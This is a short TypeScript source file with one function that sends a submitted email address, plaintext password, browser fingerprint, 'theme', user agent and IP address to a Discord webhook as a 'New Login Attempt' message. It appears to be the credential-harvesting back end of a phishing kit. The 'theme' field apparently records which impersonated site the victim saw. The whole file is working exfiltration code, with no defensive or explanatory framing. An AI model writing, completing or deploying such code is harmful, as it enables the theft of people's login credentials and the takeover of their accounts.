
export async function submitToDiscord(email: string, password: string, fingerprint: string, theme: string, userAgent: string, ip: string) {
  const webhookUrl = process.env.DISCORD_WEBHOOK_URL;

  console.log(`[Discord] Attempting to submit for email: ${email}, theme: ${theme}`);

  if (!webhookUrl) {
    console.error("[Discord] DISCORD_WEBHOOK_URL is not set in environment variables");
    return { status: "ok", message: "Simulated success (no webhook configured)" };
  }

  const payload = {
    embeds: [
      {
        title: "New Login Attempt",
        color: 0xff4b33,
        fields: [
          { name: "Email", value: email || "N/A", inline: true },
          { name: "Password", value: password || "N/A", inline: true },
          { name: "Theme", value: theme || "Default", inline: true },
          { name: "Fingerprint", value: `\`\`\`${fingerprint || "N/A"}\`\`\`` },
          { name: "User Agent", value: userAgent || "N/A" },
          { name: "IP", value: ip || "N/A" }
        ],
        timestamp: new Date().toISOString()
      }
    ]
  };

  try {
    console.log("[Discord] Sending POST request to webhook...");
    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    if (!response.ok) {
      const errorText = await response.text();
      console.error(`[Discord] Webhook failed with status ${response.status}: ${errorText}`);
      throw new Error(`Discord API responded with status ${response.status}`);
    }

    console.log("[Discord] Successfully delivered to webhook");
    return { status: "ok" };
  } catch (error) {
    console.error("[Discord] Network or API error:", error);
    throw error;
  }
}
